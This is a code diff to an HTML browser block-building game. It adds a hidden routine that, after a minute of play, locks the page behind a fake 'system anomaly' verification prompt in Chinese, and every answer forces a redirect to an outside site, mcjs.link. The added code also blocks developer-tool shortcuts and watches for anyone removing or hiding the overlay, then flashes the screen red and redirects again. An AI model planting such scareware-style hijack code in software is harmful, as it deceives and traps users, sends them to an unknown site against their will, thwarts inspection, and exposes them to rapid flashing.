@@ -147,6 +147,60 @@
   }
   .mode-toggle:hover { background: #333; }
   .mode-toggle b { color: #ffd700; }
+  
+  /* 异常弹窗样式 */
+  .anomaly-overlay {
+    position: fixed;
+    inset: 0;
+    background: #000;
+    z-index: 9999;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    pointer-events: auto;
+    animation: anomalyFadeIn 0.3s ease-in;
+  }
+  .anomaly-content {
+    text-align: center;
+    padding: 40px;
+    border: 3px solid #ff0000;
+    background: #000;
+    box-shadow: 0 0 50px rgba(255,0,0,0.5);
+    animation: anomalyPulse 1s infinite;
+  }
+  .anomaly-title {
+    color: #ff0000;
+    font-size: 36px;
+    font-weight: bold;
+    margin-bottom: 20px;
+    text-shadow: 0 0 20px #ff0000;
+    letter-spacing: 3px;
+  }
+  .anomaly-text {
+    color: #ff4444;
+    font-size: 18px;
+    margin: 10px 0;
+    letter-spacing: 2px;
+  }
+  .anomaly-warning {
+    color: #ff0000;
+    font-size: 24px;
+    font-weight: bold;
+    margin: 20px 0;
+    animation: anomalyBlink 0.5s infinite;
+  }
+  @keyframes anomalyFadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+  }
+  @keyframes anomalyPulse {
+    0%, 100% { box-shadow: 0 0 30px rgba(255,0,0,0.3); }
+    50% { box-shadow: 0 0 80px rgba(255,0,0,0.8); }
+  }
+  @keyframes anomalyBlink {
+    0%, 49% { opacity: 1; }
+    50%, 100% { opacity: 0.3; }
+  }
 </style>
 </head>
 <body>
@@ -849,7 +903,176 @@
   updateHotbar();
 
   // ===== 游戏循环 =====
+  let gameStartTime = Date.now();
+  let anomalyTriggered = false;
+
+  function triggerAnomaly() {
+    if (anomalyTriggered) return;
+    anomalyTriggered = true;
+
+    const overlay = document.createElement('div');
+    overlay.className = 'anomaly-overlay';
+    overlay.id = 'anomalyOverlay';
+    overlay.innerHTML = `
+      <div class="anomaly-content" id="anomalyContent">
+        <div class="anomaly-title">⚠ 系统异常 ⚠</div>
+        <div class="anomaly-text">未检测到正确的验证号码。</div>
+        <div class="anomaly-text">要输入号码吗？</div>
+        <div style="margin-top:20px; display:flex; gap:20px; justify-content:center;">
+          <button id="btnYes" style="padding:8px 24px; font-size:16px; background:#c0392b; color:#fff; border:2px solid #ff0000; cursor:pointer; font-family:inherit;">是</button>
+          <button id="btnNo" style="padding:8px 24px; font-size:16px; background:#333; color:#fff; border:2px solid #555; cursor:pointer; font-family:inherit;">否</button>
+        </div>
+      </div>
+    `;
+
+    document.body.appendChild(overlay);
+
+    document.getElementById('btnYes').addEventListener('click', () => {
+      window.location.href = 'https://mcjs.link';
+    });
+
+    document.getElementById('btnNo').addEventListener('click', () => {
+      const content = document.getElementById('anomalyContent');
+      content.innerHTML = `
+        <div class="anomaly-title">⚠ 系统异常 ⚠</div>
+        <div class="anomaly-text">请输入验证号码：</div>
+        <input type="text" id="verifyInput" style="padding:8px; font-size:16px; width:200px; text-align:center; background:#111; color:#fff; border:2px solid #ff0000; font-family:inherit; margin-top:10px;" autocomplete="off">
+        <div style="margin-top:15px;">
+          <button id="btnSubmit" style="padding:8px 24px; font-size:16px; background:#c0392b; color:#fff; border:2px solid #ff0000; cursor:pointer; font-family:inherit;">提交</button>
+        </div>
+      `;
+
+      document.getElementById('btnSubmit').addEventListener('click', handleVerify);
+      document.getElementById('verifyInput').addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') handleVerify();
+      });
+      document.getElementById('verifyInput').focus();
+    });
+
+    function handleVerify() {
+      const content = document.getElementById('anomalyContent');
+      content.innerHTML = `
+        <div class="anomaly-title">⚠ 系统异常 ⚠</div>
+        <div class="anomaly-warning">检测号码中……</div>
+      `;
+
+      setTimeout(() => {
+        content.innerHTML = `
+          <div class="anomaly-title">⚠ 系统异常 ⚠</div>
+          <div class="anomaly-warning">检测失败。</div>
+          <div class="anomaly-text">这不是一个有效的号码。</div>
+        `;
+
+        const ov = document.getElementById('anomalyOverlay');
+        let flashCount = 0;
+        const flashInterval = setInterval(() => {
+          flashCount++;
+          if (flashCount % 2 === 1) {
+            ov.style.background = '#ff0000';
+          } else {
+            ov.style.background = '#000';
+          }
+          if (flashCount >= 6) {
+            clearInterval(flashInterval);
+            ov.style.background = '#000';
+          }
+        }, 200);
+
+        setTimeout(() => {
+          window.location.href = 'https://mcjs.link';
+        }, 2500);
+      }, 2000);
+    }
+
+    // ===== 反开发者工具检测 =====
+    let antiCheatTriggered = false;
+
+    function triggerAntiCheat() {
+      if (antiCheatTriggered) return;
+      antiCheatTriggered = true;
+
+      const content = document.getElementById('anomalyContent');
+      content.innerHTML = `
+        <div class="anomaly-title">⚠ 系统异常 ⚠</div>
+        <div class="anomaly-warning">你想干什么？作弊吗？</div>
+      `;
+
+      const ov = document.getElementById('anomalyOverlay');
+      let flashCount = 0;
+      const flashInterval = setInterval(() => {
+        flashCount++;
+        if (flashCount % 2 === 1) {
+          ov.style.background = '#ff0000';
+        } else {
+          ov.style.background = '#000';
+        }
+        if (flashCount >= 10) {
+          clearInterval(flashInterval);
+          ov.style.background = '#000';
+        }
+      }, 150);
+
+      setTimeout(() => {
+        window.location.href = 'https://mcjs.link';
+      }, 3000);
+    }
+
+    // 检测弹窗是否被删除（DOM 变化观察）
+    const observer = new MutationObserver((mutations) => {
+      for (const mutation of mutations) {
+        for (const node of mutation.removedNodes) {
+          if (node.id === 'anomalyOverlay' || (node.contains && node.contains(document.getElementById('anomalyOverlay')))) {
+            triggerAntiCheat();
+            observer.disconnect();
+            return;
+          }
+        }
+      }
+    });
+    observer.observe(document.body, { childList: true, subtree: true });
+
+    // 检测弹窗样式被修改（如 display: none）
+    const styleObserver = new MutationObserver((mutations) => {
+      for (const mutation of mutations) {
+        if (mutation.target.id === 'anomalyOverlay') {
+          const style = window.getComputedStyle(mutation.target);
+          if (style.display === 'none' || style.visibility === 'hidden' || style.opacity === '0') {
+            triggerAntiCheat();
+            styleObserver.disconnect();
+            return;
+          }
+        }
+      }
+    });
+    styleObserver.observe(overlay, { attributes: true, attributeFilter: ['style', 'class'] });
+
+    // 检测开发者工具快捷键
+    window.addEventListener('keydown', (e) => {
+      if (
+        e.key === 'F12' ||
+        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+        (e.ctrlKey && e.key === 'U')
+      ) {
+        e.preventDefault();
+        triggerAntiCheat();
+      }
+    });
+
+    // 定期检测弹窗是否还存在
+    const checkInterval = setInterval(() => {
+      if (!document.getElementById('anomalyOverlay')) {
+        triggerAntiCheat();
+        clearInterval(checkInterval);
+      }
+    }, 500);
+  }
+
   function gameLoop() {
+    // 检查是否已运行一分钟
+    if (!anomalyTriggered && Date.now() - gameStartTime >= 60000) {
+      triggerAnomaly();
+    }
+    
     update();
     render();
 
